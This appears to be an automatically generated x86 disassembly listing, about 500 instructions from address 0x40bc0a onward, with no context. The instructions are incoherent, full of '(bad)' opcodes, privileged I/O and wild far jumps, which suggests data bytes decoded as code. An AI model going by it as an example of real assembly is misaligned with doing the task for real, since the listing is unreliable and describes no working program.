  40bc0a:	bound  ebp,QWORD PTR [edx]
  40bc0c:	fwait
  40bc0d:	lods   al,BYTE PTR ds:[esi]
  40bc0e:	ror    DWORD PTR [ecx+ebp*4+0x2],0xec
  40bc13:	cmp    eax,0x510274e6
  40bc18:	stos   BYTE PTR es:[edi],al
  40bc19:	xchg   esi,eax
  40bc1a:	mov    eax,ds:0x33238162
  40bc1f:	inc    esp
  40bc20:	cwde   
  40bc21:	adc    eax,0x875e89dc
  40bc26:	mov    cl,0xc8
  40bc28:	xrelease mov DWORD PTR gs:[edi+0xdc900a0],edi
  40bc30:	js     0x40bbff
  40bc32:	cmp    edi,esp
  40bc34:	shl    esi,1
  40bc36:	sub    ebx,ecx
  40bc38:	scas   eax,DWORD PTR es:[edi]
  40bc39:	add    DWORD PTR [eax-0xa],edi
  40bc3c:	or     eax,0xa8f55685
  40bc41:	mov    fs:0x5021e681,eax
  40bc47:	adc    bl,cl
  40bc49:	dec    ebx
  40bc4a:	and    BYTE PTR [ebp-0x2f],0x17
  40bc4e:	pop    edx
  40bc4f:	jbe    0x40bc16
  40bc51:	ret    
  40bc52:	push   ecx
  40bc53:	xor    eax,0xf30fb138
  40bc58:	iret   
  40bc59:	or     BYTE PTR [edi],cl
  40bc5b:	add    DWORD PTR [bp+0x56],edi
  40bc5f:	sub    DWORD PTR [ecx-0x73],ecx
  40bc62:	je     0x40bc37
  40bc64:	mov    DWORD PTR [ecx-0x24deb11f],eax
  40bc6a:	jae    0x40bcda
  40bc6c:	push   cs
  40bc6d:	jb     0x40bc32
  40bc6f:	clc    
  40bc70:	mov    WORD PTR [edx+edx*1],cs
  40bc73:	into   
  40bc74:	push   ds
  40bc75:	test   BYTE PTR [edx],bl
  40bc77:	shl    edi,cl
  40bc79:	jns    0x40bc06
  40bc7b:	xchg   esi,eax
  40bc7c:	(bad)  
  40bc7e:	push   0xffffffdb
  40bc80:	xor    ah,0x29
  40bc83:	mov    esp,0xe351da2c
  40bc88:	inc    ah
  40bc8a:	xchg   edx,eax
  40bc8b:	pop    ss
  40bc8c:	jmp    0x7245cc18
  40bc91:	fwait
  40bc92:	and    eax,0x8673118b
  40bc97:	dec    ebp
  40bc98:	pop    ds
  40bc99:	bound  edx,QWORD PTR [ebp+esi*8-0x5537f025]
  40bca0:	inc    esi
  40bca1:	dec    eax
  40bca2:	test   BYTE PTR [edx],ch
  40bca4:	mov    edi,DWORD PTR [edx+0x7]
  40bca7:	cld    
  40bca8:	jl     0x40bc96
  40bcaa:	sub    DWORD PTR [ebp+0x6b],esp
  40bcad:	(bad)  
  40bcae:	fldcw  WORD PTR [ecx+0xaea3dbc]
  40bcb4:	mov    esi,0x359e74c3
  40bcb9:	outs   dx,DWORD PTR ds:[esi]
  40bcba:	repnz or al,0x54
  40bcbe:	sahf   
  40bcbf:	or     eax,0x61641c1d
  40bcc4:	outs   dx,BYTE PTR ds:[esi]
  40bcc5:	mov    ch,0xc7
  40bcc7:	lock jbe 0x40bd43
  40bcca:	push   ecx
  40bccb:	or     DWORD PTR [eax],0x3b8ab7db
  40bcd1:	fwait
  40bcd2:	add    eax,0x32006b31
  40bcd7:	loopne 0x40bd22
  40bcd9:	xchg   esi,eax
  40bcda:	xchg   ebp,eax
  40bcdb:	icebp  
  40bcdc:	adc    edx,DWORD PTR [ebp-0x2f692f7f]
  40bce2:	fbld   TBYTE PTR [ecx+0x33]
  40bce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bce6:	std    
  40bce7:	mov    dh,0x48
  40bce9:	mov    ds:0x3a004013,al
  40bcee:	dec    ecx
  40bcef:	ins    DWORD PTR es:[edi],dx
  40bcf0:	and    eax,0x7f2e8e8
  40bcf5:	mov    ebx,0x190db16a
  40bcfa:	cmp    BYTE PTR [esi],al
  40bcfc:	into   
  40bcfd:	adc    DWORD PTR [ecx+0x29],edi
  40bd00:	dec    edi
  40bd01:	dec    ebx
  40bd02:	mov    dh,0x80
  40bd04:	stos   BYTE PTR es:[edi],al
  40bd05:	cmp    esi,DWORD PTR [edx-0x773c23c1]
  40bd0b:	add    ch,BYTE PTR [ebx+0x32]
  40bd0e:	fcomp  QWORD PTR [ebx+edi*1]
  40bd11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd12:	call   DWORD PTR [esi]
  40bd14:	popf   
  40bd15:	push   es
  40bd16:	xchg   DWORD PTR [edi],edx
  40bd18:	sbb    eax,0x1bf6dfdc
  40bd1d:	aas    
  40bd1e:	sub    cl,BYTE PTR [ebp-0x57]
  40bd21:	inc    edi
  40bd22:	sbb    ebp,ebx
  40bd24:	add    BYTE PTR [edx-0x38],ah
  40bd27:	in     al,dx
  40bd28:	or     BYTE PTR [edi-0x3c8f8b79],cl
  40bd2e:	xchg   esp,ebp
  40bd30:	pop    eax
  40bd31:	sbb    ch,dh
  40bd33:	int3   
  40bd34:	xchg   edi,eax
  40bd35:	sti    
  40bd36:	add    eax,0xa6f88bdc
  40bd3b:	scas   al,BYTE PTR es:[edi]
  40bd3c:	xchg   esi,eax
  40bd3d:	inc    edi
  40bd3e:	or     dh,BYTE PTR [edx+0x784e7675]
  40bd44:	in     eax,dx
  40bd45:	jns    0x40bd3f
  40bd47:	xchg   esp,eax
  40bd48:	mov    edx,esp
  40bd4a:	adc    edx,DWORD PTR [esi-0x4a]
  40bd4d:	xchg   DWORD PTR [edx+0x67],ebx
  40bd50:	in     ax,0x89
  40bd53:	mov    esi,0x7fc8ecdf
  40bd58:	jbe    0x40bd1f
  40bd5a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd5c:	xchg   edx,eax
  40bd5d:	lods   al,BYTE PTR ds:[esi]
  40bd5e:	lods   al,BYTE PTR ds:[esi]
  40bd5f:	(bad)  
  40bd60:	in     al,dx
  40bd61:	scas   eax,DWORD PTR es:[edi]
  40bd62:	inc    ebp
  40bd63:	fadd   QWORD PTR [edi-0x9374c63]
  40bd69:	jo     0x40bd78
  40bd6b:	dec    esi
  40bd6c:	sub    bh,BYTE PTR [ecx]
  40bd6e:	and    BYTE PTR [eiz*1+0x604fe7e],dh
  40bd75:	icebp  
  40bd76:	mov    fs,WORD PTR [ebp+eiz*1-0x76c37abc]
  40bd7d:	adc    ah,BYTE PTR [ebx]
  40bd7f:	popa   
  40bd80:	xchg   BYTE PTR [eax+0x58],dh
  40bd83:	mov    dh,0xca
  40bd85:	xor    dl,bh
  40bd87:	cwde   
  40bd88:	imul   edx,DWORD PTR [edi+0x7db4108f],0xffffffb6
  40bd8f:	adc    BYTE PTR [esi+0x870c0a0],ch
  40bd95:	jne    0x40bd52
  40bd97:	test   DWORD PTR [ebx+0x44890824],esp
  40bd9d:	or     DWORD PTR [ecx-0x64],esi
  40bda0:	js     0x40be17
  40bda2:	leave  
  40bda3:	inc    edi
  40bda4:	jge    0x40bdc4
  40bda6:	pop    esp
  40bda7:	sub    bh,BYTE PTR [edi+0x74fa5971]
  40bdad:	add    eax,0x22acb255
  40bdb2:	mov    bh,0xf2
  40bdb4:	jae    0x40bd62
  40bdb6:	inc    ebp
  40bdb7:	retf   0xd384
  40bdba:	test   eax,0x415660f
  40bdbf:	add    al,0xef
  40bdc1:	mov    ch,0x32
  40bdc3:	adc    ecx,edi
  40bdc5:	loop   0x40bdcc
  40bdc7:	inc    ebp
  40bdc8:	int    0x55
  40bdca:	and    DWORD PTR [eax-0x459667b2],eax
  40bdd0:	mul    DWORD PTR [ebx]
  40bdd2:	out    dx,al
  40bdd3:	mov    BYTE PTR [ecx+0x38],bh
  40bdd6:	jg     0x40be0d
  40bdd8:	sub    al,0xf8
  40bdda:	out    dx,eax
  40bddb:	pop    edx
  40bddc:	or     DWORD PTR [ebx-0x6a],edi
  40bddf:	ds sbb eax,ebx
  40bde2:	shr    DWORD PTR [edx],cl
  40bde4:	out    dx,al
  40bde5:	fisub  DWORD PTR ds:0x39177865
  40bdeb:	xchg   ebp,eax
  40bdec:	inc    edi
  40bded:	inc    edx
  40bdee:	shl    BYTE PTR [eax],cl
  40bdf0:	int    0x87
  40bdf2:	adc    DWORD PTR [ebx+ebx*2+0x2b23fc5c],ecx
  40bdf9:	out    dx,al
  40bdfa:	mov    esp,eax
  40bdfc:	imul   edi,edx,0x79
  40bdff:	pushf  
  40be00:	mov    esi,esp
  40be02:	les    ebp,FWORD PTR [eax-0x5f]
  40be05:	cmp    al,dl
  40be07:	je     0x40bdbb
  40be09:	fcomp  QWORD PTR ds:0xeaafad4a
  40be0f:	out    dx,al
  40be10:	push   esi
  40be11:	mov    ds:0xaf0a34a2,eax
  40be16:	psrad  mm5,QWORD PTR es:[edi-0x62b863e5]
  40be1e:	sti    
  40be1f:	cmp    BYTE PTR [ecx],0xb9
  40be22:	pop    edi
  40be23:	inc    eax
  40be24:	neg    DWORD PTR [edi+0x2f]
  40be27:	das    
  40be28:	mov    esp,0xc244704a
  40be2d:	leave  
  40be2e:	pop    ebp
  40be2f:	push   eax
  40be30:	iret   
  40be31:	test   BYTE PTR [ecx],al
  40be33:	dec    eax
  40be34:	mov    eax,ds:0x9dc52573
  40be39:	mov    bh,BYTE PTR [esi-0x2da5a8d5]
  40be3f:	adc    eax,0x781e41a4
  40be44:	fisubr DWORD PTR [edx+ebp*8-0x63]
  40be48:	sar    ecx,1
  40be4a:	popf   
  40be4b:	adc    bh,BYTE PTR [eax+0x55]
  40be4e:	or     al,0xd7
  40be50:	js     0x40bdeb
  40be52:	lods   al,BYTE PTR ds:[esi]
  40be53:	dec    ebx
  40be54:	lahf   
  40be55:	int    0x75
  40be57:	jne    0x40bece
  40be59:	sbb    BYTE PTR [edi],0xdc
  40be5c:	mov    ebp,0xcf4ef25
  40be61:	xor    al,0xbe
  40be63:	jl     0x40be0f
  40be65:	inc    ecx
  40be66:	mov    ds:0xe2aeb153,eax
  40be6b:	and    DWORD PTR [edi],ebx
  40be6d:	in     eax,0x3a
  40be6f:	call   0x350d:0x3b3a373b
  40be76:	rcl    BYTE PTR [ebx+0x15],0xb
  40be7a:	pushf  
  40be7b:	or     al,0xad
  40be7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be7e:	pop    es
  40be7f:	(bad)  
  40be80:	rcr    BYTE PTR [ebp-0x5aa781ff],1
  40be86:	int3   
  40be87:	aam    0xf6
  40be89:	test   eax,0xbe2a21da
  40be8e:	ss adc al,0x8
  40be91:	sub    DWORD PTR [edx+0x41],0xffffffd7
  40be95:	in     eax,0xcd
  40be97:	arpl   WORD PTR [eax+0x5c8a8dc6],bp
  40be9d:	popa   
  40be9e:	cmp    BYTE PTR [edx-0x16],bh
  40bea1:	jle    0x40be23
  40bea3:	jns    0x40be3a
  40bea5:	inc    edx
  40bea6:	aad    0xca
  40bea8:	jae    0x40bef6
  40beaa:	mov    bl,0xdc
  40beac:	add    eax,0xe4a28d34
  40beb1:	lods   eax,DWORD PTR ds:[esi]
  40beb2:	int3   
  40beb3:	jmp    0x40bead
  40beb5:	add    al,BYTE PTR [esi+0xcd42d1d]
  40bebb:	fnsave [eax-0x7c]
  40bebe:	in     eax,dx
  40bebf:	pop    es
  40bec0:	push   0xffffffe5
  40bec2:	sbb    eax,0x31ecbe04
  40bec7:	sbb    BYTE PTR [ecx],bh
  40bec9:	or     dh,BYTE PTR [ebx+0x2adcbb49]
  40becf:	ja     0x40be5b
  40bed1:	jg     0x40bea0
  40bed3:	add    ecx,edx
  40bed5:	and    bh,ch
  40bed7:	dec    eax
  40bed8:	mov    dh,0xd3
  40beda:	test   eax,0xc07e8784
  40bedf:	and    ecx,DWORD PTR [edi-0x8ab4a70]
  40bee5:	inc    eax
  40bee6:	jnp    0x40befe
  40bee8:	(bad)
  40beec:	ja     0x40bed7
  40beee:	out    dx,eax
  40beef:	mov    dh,0x6e
  40bef1:	imul   eax,DWORD PTR [ebp-0x53],0x39
  40bef5:	jns    0x40bee5
  40bef7:	xor    al,0x70
  40bef9:	test   al,0x78
  40befb:	or     cl,BYTE PTR [ecx]
  40befd:	pushf  
  40befe:	mov    ebx,0x170b18e7
  40bf03:	int3   
  40bf04:	stos   BYTE PTR es:[edi],al
  40bf05:	mov    esp,0x9e581de4
  40bf0a:	jae    0x40bf60
  40bf0c:	in     al,dx
  40bf0d:	xchg   edi,eax
  40bf0e:	pop    cx
  40bf10:	addr16 inc ebp
  40bf12:	sbb    ebp,edx
  40bf14:	push   ds
  40bf15:	xor    DWORD PTR [edi+0x16ebfd8a],ebx
  40bf1b:	outs   dx,BYTE PTR ds:[esi]
  40bf1c:	inc    esp
  40bf1d:	ret    0xc1a9
  40bf20:	addr16 add eax,0x7a4de952
  40bf26:	stc    
  40bf27:	cmp    al,0x56
  40bf29:	sub    eax,0xb94182d4
  40bf2e:	or     ecx,DWORD PTR [eax+0x3c]
  40bf31:	mov    DWORD PTR [ecx+edi*8],ebp
  40bf34:	(bad)  
  40bf35:	scas   eax,DWORD PTR es:[edi]
  40bf36:	jg     0x40bf77
  40bf38:	mov    esp,0x84b8ed3f
  40bf3d:	aad    0x30
  40bf3f:	push   ds
  40bf40:	and    BYTE PTR [ecx-0x5a],0x7
  40bf44:	lods   eax,DWORD PTR ds:[esi]
  40bf45:	cmc    
  40bf46:	or     cl,BYTE PTR [edi+0x70]
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	lods   eax,DWORD PTR ds:[esi]
  40bf4b:	mov    esi,0x9c7b1ed6
  40bf50:	sub    eax,0xf295828c
  40bf55:	dec    esi
  40bf56:	or     BYTE PTR [ebx-0x294cd71d],0xe2
  40bf5d:	jge    0x40bf4e
  40bf5f:	pop    ds
  40bf60:	ret    
  40bf61:	leave  
  40bf62:	popf   
  40bf63:	arpl   WORD PTR [eax],bp
  40bf65:	ret    
  40bf66:	xor    BYTE PTR [esi-0x7d],bh
  40bf69:	hlt    
  40bf6a:	mov    al,0xe4
  40bf6c:	pushf  
  40bf6d:	dec    ecx
  40bf6e:	cmc    
  40bf6f:	mov    edx,0x261a80fb
  40bf74:	in     eax,0x7c
  40bf76:	or     BYTE PTR [ebp-0x3c414ca3],al
  40bf7c:	int3   
  40bf7d:	xor    DWORD PTR [eax-0x1a4560fe],ebx
  40bf83:	in     eax,0x89
  40bf85:	scas   al,BYTE PTR es:[edi]
  40bf86:	dec    esi
  40bf87:	ja     0x40bf18
  40bf89:	mov    ah,0x63
  40bf8b:	xchg   BYTE PTR [ecx*2+0x6627351b],dl
  40bf92:	sub    BYTE PTR ds:0x5d68d044,0x40
  40bf99:	pop    eax
  40bf9a:	(bad)  
  40bf9b:	cld    
  40bf9c:	jns    0x40bfc1
  40bf9e:	fisubr WORD PTR [eax+0x67]
  40bfa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfa3:	jno    0x40bf51
  40bfa5:	scas   eax,DWORD PTR es:[edi]
  40bfa6:	inc    ebp
  40bfa7:	xor    al,0x5f
  40bfa9:	lea    edx,[edx]
  40bfab:	fisub  DWORD PTR [ebx]
  40bfad:	push   ebp
  40bfae:	mov    al,ds:0x788a9f26
  40bfb3:	adc    BYTE PTR [edx+0x36b6432a],ah
  40bfb9:	mov    eax,0x445817d0
  40bfbe:	or     edi,edx
  40bfc0:	inc    edx
  40bfc1:	xor    ch,dh
  40bfc3:	in     al,0x2
  40bfc5:	sbb    DWORD PTR [edi],eax
  40bfc7:	cld    
  40bfc8:	sahf   
  40bfc9:	nop
  40bfca:	cmp    BYTE PTR [ebp-0x3b],ah
  40bfcd:	push   ecx
  40bfce:	jnp    0x40bf72
  40bfd0:	xor    WORD PTR [esp+eiz*2],bx
  40bfd4:	loop   0x40bf9b
  40bfd6:	(bad)  
  40bfd8:	sahf   
  40bfd9:	ins    DWORD PTR es:[edi],dx
  40bfda:	jo     0x40c004
  40bfdc:	jle    0x40c047
  40bfde:	pop    ds
  40bfdf:	js     0x40bfa5
  40bfe1:	popf   
  40bfe2:	outs   dx,BYTE PTR ds:[esi]
  40bfe3:	aad    0x6f
  40bfe5:	xlat   BYTE PTR ds:[ebx]
  40bfe6:	jmp    FWORD PTR [edi]
  40bfe8:	sub    edi,DWORD PTR [esi+0x12]
  40bfeb:	or     edx,DWORD PTR [ebx]
  40bfed:	inc    edi
  40bfee:	or     DWORD PTR [esi+0x374cdc01],edx
  40bff4:	aad    0x1c
  40bff6:	icebp  
  40bff7:	pop    edi
  40bff8:	or     DWORD PTR [eax-0xe632474],ebx
  40bffe:	mov    esi,DWORD PTR [eax-0x7363fcaf]
  40c004:	mov    eax,ds:0xe2afc362
  40c009:	pop    edi
  40c00a:	hlt    
  40c00b:	mov    ds:0xf2c48084,al
  40c010:	or     cl,BYTE PTR [ebp+0x161ff78f]
  40c016:	pop    ds
  40c017:	mov    eax,0x4ca1f300
  40c01c:	add    bh,BYTE PTR [edx+ebp*8+0x104fcf64]
  40c023:	xchg   ebp,eax
  40c024:	adc    ecx,edx
  40c026:	adc    DWORD PTR [ecx+0x64af787],ecx
  40c02c:	retf   0x51fb
  40c02f:	out    0x40,eax
  40c031:	push   ebx
  40c032:	inc    esi
  40c033:	aaa    
  40c034:	mov    dl,0x24
  40c036:	addr16 xchg esp,eax
  40c038:	rcr    BYTE PTR [ebx+0x798d6869],0x75
  40c03f:	fcom   QWORD PTR [edi-0x6f]
  40c042:	aam    0x18
  40c044:	mov    WORD PTR [edi+0x4ae93b5d],ds
  40c04a:	scas   eax,DWORD PTR es:[edi]
  40c04b:	mov    edx,0xe5d4cb77
  40c050:	push   ebx
  40c051:	out    0xdd,al
  40c053:	paddw  mm3,mm3
  40c056:	add    BYTE PTR [esi-0x3f],bl
  40c059:	sbb    eax,0xf140d2c0
  40c05e:	lock jecxz 0x40c00d
  40c061:	pop    eax
  40c062:	sti    
  40c063:	loopne 0x40c003
  40c065:	int3   
  40c066:	out    0x4d,al
  40c068:	retf   0x76b4
  40c06b:	enter  0x53a4,0x83
  40c06f:	cmp    DWORD PTR [eax-0x6],0xffffffaa
  40c073:	test   al,0x22
  40c075:	loope  0x40c0c2
  40c077:	test   BYTE PTR [ebp+eax*2-0x67c421e4],dh
  40c07e:	(bad)  
  40c07f:	lea    edi,ds:[ebx-0x62]
  40c083:	jne    0x40c074
  40c085:	andps  xmm0,XMMWORD PTR [ebx-0x3f0dfb84]
  40c08c:	cli    
  40c08d:	add    al,0x55
  40c08f:	xchg   esp,eax
  40c090:	mov    esp,0xc319d6b
  40c095:	(bad)  
  40c096:	cwde   
  40c097:	dec    eax
  40c098:	dec    esi
  40c099:	int3   
  40c09a:	in     eax,0xb3
  40c09c:	mov    bl,0xe2
  40c09e:	sbb    ecx,esp
  40c0a0:	fadd   st(6),st
  40c0a2:	scas   al,BYTE PTR es:[edi]
  40c0a3:	mov    ebx,0xf32fd7f6
  40c0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0a9:	cmp    al,0x2e
  40c0ab:	clc    
  40c0ac:	lock push esp
  40c0ae:	mov    BYTE PTR [edi],cl
  40c0b0:	test   eax,0xa8e83ab4
  40c0b5:	clc    
  40c0b6:	mov    esi,0x58bc110e
  40c0bb:	mov    cl,0x8e
  40c0bd:	sub    DWORD PTR [edx+0x10b61e2a],esp
  40c0c3:	lods   eax,DWORD PTR ds:[esi]
  40c0c4:	adc    esi,eax
  40c0c6:	mov    dh,0x5a
  40c0c8:	jmp    0x40c12a
  40c0ca:	or     DWORD PTR [ebx+0x44],0x80977285
  40c0d1:	popa   
  40c0d2:	stos   BYTE PTR es:[edi],al
  40c0d3:	ss push ds
  40c0d5:	stc    
  40c0d6:	enter  0x655f,0x93
  40c0da:	sub    dh,BYTE PTR [esi-0x71314c68]
  40c0e0:	mov    ch,0x93
  40c0e2:	call   DWORD PTR [ebp-0xf]
  40c0e5:	sbb    ch,BYTE PTR [ebp+0xe]
  40c0e8:	repz push es
  40c0ea:	ret    0x2e9f
  40c0ed:	sub    al,0x77
  40c0ef:	aas    
  40c0f0:	inc    esi
  40c0f1:	jmp    0x40c0d3
  40c0f3:	fstp   TBYTE PTR [ebx]
  40c0f5:	call   FWORD PTR [edi]
  40c0f7:	push   ebx
  40c0f8:	pop    ds
  40c0f9:	mov    ch,0xd9
  40c0fb:	scas   eax,DWORD PTR es:[edi]
  40c0fc:	std    
  40c0fd:	aam    0xea
  40c0ff:	enter  0xc043,0xcc
  40c103:	mov    ds:0x68a5687d,eax
  40c108:	outs   dx,DWORD PTR ds:[esi]
  40c109:	and    DWORD PTR [edx+edi*1+0x75],ebp
  40c10d:	pop    ebx
  40c10e:	push   0x4539a23b
  40c113:	mov    al,0xf4
  40c115:	cmc    
  40c116:	xchg   edi,eax
  40c117:	adc    esp,DWORD PTR [esi]
  40c119:	jnp    0x40c0d4
  40c11b:	sbb    ah,BYTE PTR es:[ebx]
  40c11e:	daa    
  40c11f:	cmp    al,0x27
  40c121:	out    dx,eax
  40c122:	sbb    eax,0x39d0fa32
  40c127:	dec    esi
  40c128:	mov    BYTE PTR [edi],ah
  40c12a:	ret    
  40c12b:	outs   dx,DWORD PTR ds:[esi]
  40c12c:	adc    ah,dh
  40c12e:	in     eax,0x2c
  40c130:	pop    eax
  40c131:	sar    DWORD PTR [ebx],0x21
  40c134:	push   ebp
  40c135:	xchg   esp,eax
  40c136:	push   0x5a0b3eb8
  40c13b:	imul   ebx,DWORD PTR [ebx+0x5d],0x743af90f
  40c142:	addr16 jge 0x40c0e7
  40c145:	add    DWORD PTR [ebp-0x80],esi
  40c148:	ja     0x40c19b
  40c14a:	mov    cl,0xfe
  40c14c:	dec    ebp
  40c14d:	push   esi
  40c14e:	jmp    0x40c1ad
  40c150:	jp     0x40c0f2
  40c152:	push   esi
  40c153:	jg     0x40c101
  40c155:	adc    eax,0x1ede18d5
  40c15a:	push   ds
  40c15b:	xor    ebp,edi
  40c15d:	out    dx,al
  40c15e:	prefetch BYTE PTR [edx+0x5]
  40c162:	sub    DWORD PTR [ebx+0x2b1b3e9b],ebp
  40c168:	mov    esi,0xc765d9d1
  40c16d:	ret    0x2110
  40c170:	sub    eax,0xcef4a2c
  40c175:	xchg   ebp,eax
  40c176:	(bad)  
  40c177:	int    0x8
  40c179:	ins    BYTE PTR es:[edi],dx
  40c17a:	(bad)  
  40c17c:	ja     0x40c1c6
  40c17e:	sar    DWORD PTR [edx],0x99
  40c181:	mov    dl,0x39
  40c183:	imul   ebx,DWORD PTR [ecx],0x27
  40c186:	mov    edx,DWORD PTR [ebx-0x37]
  40c189:	jno    0x40c1d0
  40c18b:	out    dx,eax
  40c18c:	inc    ecx
  40c18d:	inc    ebp
  40c18e:	retf   0x255
  40c191:	aad    0x75
  40c193:	mov    ebx,0xbc0a1dea
  40c198:	in     eax,0xec
  40c19a:	dec    esi
  40c19b:	xchg   DWORD PTR [edx],edi
  40c19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19e:	test   DWORD PTR [edi-0xb],edi
  40c1a1:	in     eax,dx
  40c1a2:	in     eax,dx
  40c1a3:	sbb    cl,BYTE PTR [esi-0x784ea40a]
  40c1a9:	xchg   BYTE PTR [edi],bh
  40c1ab:	cli    
  40c1ac:	in     eax,0xb7
  40c1ae:	adc    al,0x5c
  40c1b0:	jnp    0x40c197
  40c1b2:	mov    ds:0x45835862,eax
  40c1b7:	stc    
  40c1b8:	mov    dl,BYTE PTR [ecx]
  40c1ba:	mov    esp,0x53343d08
  40c1bf:	or     al,0xcf
  40c1c1:	push   ebp
  40c1c2:	(bad)  
  40c1c4:	jl     0x40c1a5
  40c1c6:	xchg   ecx,eax
  40c1c7:	mov    bh,0xd4
  40c1c9:	call   0x4ab1a526
  40c1ce:	ret    0xa2ad
  40c1d1:	jle    0x40c1cc
  40c1d3:	scas   eax,DWORD PTR es:[edi]
  40c1d4:	jbe    0x40c1c5
  40c1d6:	mov    ebp,0x64813135
  40c1db:	ja     0x40c249
  40c1dd:	je     0x40c197
  40c1df:	outs   dx,DWORD PTR ds:[esi]
  40c1e0:	cwde   
  40c1e1:	add    DWORD PTR [edx-0x56090ce6],0xffffffe6
  40c1e8:	push   ebp
  40c1e9:	mov    ds:0x19da19e8,eax
  40c1ee:	sub    eax,0xf8257393
  40c1f3:	ror    BYTE PTR [edx+0x40],0x76
  40c1f7:	popa   
  40c1f8:	cld    
  40c1f9:	xor    eax,0x9642ddc
  40c1fe:	mov    WORD PTR [eax-0x3706091f],gs
  40c204:	mov    eax,0x2be2126a
  40c209:	push   ds
  40c20a:	mov    edx,edi
  40c20c:	out    0xb5,al
  40c20e:	and    eax,0xdda922be
  40c213:	fiadd  DWORD PTR [esi-0x78]
  40c216:	or     bl,BYTE PTR [ecx-0x76]
  40c219:	pop    edi
  40c21a:	mov    ds:0x7614a950,eax
  40c21f:	xor    ecx,DWORD PTR [ebp-0x3a]
  40c222:	les    esi,FWORD PTR [eax+0x5c9b36d6]
  40c228:	sub    BYTE PTR [edi+0x3d],dl
  40c22b:	cdq    
  40c22c:	aam    0xa5
  40c22e:	rcr    DWORD PTR [eax*2-0x62e069e4],1
  40c235:	jmp    0x80c9:0x1640dba5
  40c23c:	or     al,0xe4
  40c23e:	stos   DWORD PTR es:[edi],eax
  40c23f:	and    DWORD PTR ds:0x9cac701a,eax
  40c245:	dec    ecx
  40c246:	je     0x40c1cd
  40c248:	ror    BYTE PTR [edx+ebx*1],1
  40c24b:	mov    edx,0x26f367b7
  40c250:	mov    eax,ds:0x8c22a551
  40c255:	push   eax
  40c256:	test   al,0x8e
  40c258:	dec    edx
  40c259:	mov    ecx,0x70968930
  40c25e:	icebp  
  40c25f:	dec    esi
  40c260:	addr16 mov edx,0xda18236e
  40c266:	sub    ebx,DWORD PTR [esi+0x3d]
  40c269:	sub    edx,DWORD PTR [esi]
  40c26b:	cmp    DWORD PTR [edx+0x69],ebx
  40c26e:	nop
  40c26f:	mov    BYTE PTR [ecx],cl
  40c271:	xor    al,0x56
  40c273:	mov    dl,0x6b
  40c275:	in     al,0xb
  40c277:	out    dx,eax
  40c278:	fmul   QWORD PTR [edi-0x18f1cef9]
  40c27e:	dec    ebp
  40c27f:	jno    0x40c2ce
  40c281:	or     dh,BYTE PTR [ecx+0x6f]
  40c284:	adc    eax,0xca3b4ecd
  40c289:	call   edx
  40c28b:	pop    gs
  40c28d:	fwait
  40c28e:	aaa    
  40c28f:	cld    
  40c290:	pop    edx
  40c291:	inc    ecx
  40c292:	adc    BYTE PTR [ecx+ecx*1+0x2f],dl
  40c296:	or     ecx,DWORD PTR [eax+0x45]
  40c299:	shl    BYTE PTR [edx+0x3c],0x3
  40c29d:	mov    dl,0xfa
  40c29f:	rol    DWORD PTR [eax],1
  40c2a1:	add    BYTE PTR [esi+0x22],0x99
  40c2a5:	pop    ecx
  40c2a6:	std    
  40c2a7:	push   es
  40c2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a9:	cld    
  40c2aa:	and    eax,0x9b271a73
  40c2af:	jae    0x40c31f
  40c2b1:	lds    eax,FWORD PTR [eax+0x5136b462]
  40c2b7:	push   ebx
  40c2b8:	add    bh,BYTE PTR ds:[ebp+0x32da43c4]
  40c2bf:	cmc    
  40c2c0:	cmp    BYTE PTR [ecx+0x613f0627],ah
  40c2c6:	push   ebp
  40c2c7:	sub    eax,DWORD PTR [ebp-0x1d]
  40c2ca:	call   DWORD PTR [ecx]
  40c2cc:	out    0x13,al
  40c2ce:	popa   
  40c2cf:	lea    ebp,[eax+0x4d]
  40c2d2:	inc    eax
  40c2d3:	jb     0x40c341
  40c2d5:	arpl   WORD PTR [ecx-0x558b099d],si
  40c2db:	in     eax,dx
  40c2dc:	std    
  40c2dd:	xchg   edi,eax
  40c2de:	mov    edi,0xcbbb7148
  40c2e3:	nop
  40c2e4:	mov    ch,0x63
  40c2e6:	push   edx
  40c2e7:	and    edx,DWORD PTR ds:0x347a86e4
  40c2ed:	cwde   
  40c2ee:	push   ecx
  40c2ef:	into   
  40c2f0:	loop   0x40c34b
  40c2f2:	xchg   esp,eax
  40c2f3:	mov    esi,0xc4ee5df3
  40c2f8:	lahf   
  40c2f9:	push   ebp
  40c2fa:	fdivr  st,st(6)
  40c2fc:	mov    eax,ds:0xe2a50292
  40c301:	sub    dl,BYTE PTR [ecx]
  40c303:	inc    edi
  40c304:	or     ecx,0xffffffe8
  40c307:	mov    cs,WORD PTR [edx]
  40c309:	mov    cs,WORD PTR [eax+0x6c]
  40c30c:	pop    ecx
  40c30d:	div    ebp
  40c30f:	or     eax,0x188e671c
  40c314:	(bad)  
  40c315:	adc    al,0xe3
  40c317:	sub    DWORD PTR [ecx],ebx
  40c319:	stos   DWORD PTR es:[edi],eax
  40c31a:	test   BYTE PTR [edx+0x60],al
  40c31d:	jle    0x40c37e
  40c31f:	jb     0x40c380
  40c321:	and    DWORD PTR [ebx+0x51e5f3fa],edi
  40c327:	sub    esi,ebx
  40c329:	inc    esp
  40c32a:	stos   DWORD PTR es:[edi],eax
  40c32b:	push   ss
  40c32c:	jb     0x40c30c
  40c32e:	dec    esi
  40c32f:	xchg   ebx,eax
  40c330:	call   0xa0f6:0x5303cae3
  40c337:	xchg   edi,eax
  40c338:	out    0xe2,al
  40c33a:	jne    0x40c3ab
  40c33c:	shl    DWORD PTR [edx],cl
  40c33e:	ret    
  40c33f:	mov    edx,0xdf9c69a5
  40c344:	enter  0x3fcb,0xc6
  40c348:	(bad)  
  40c34a:	pop    eax
  40c34b:	lods   al,BYTE PTR ds:[esi]
  40c34c:	cmp    dl,BYTE PTR [ebp+0x41284764]
  40c352:	gs xor DWORD PTR gs:[edx],ebp
  40c356:	and    BYTE PTR [eax],al
  40c358:	mov    dh,0x2a
  40c35a:	test   BYTE PTR [ebx+0x61d21d7b],cl
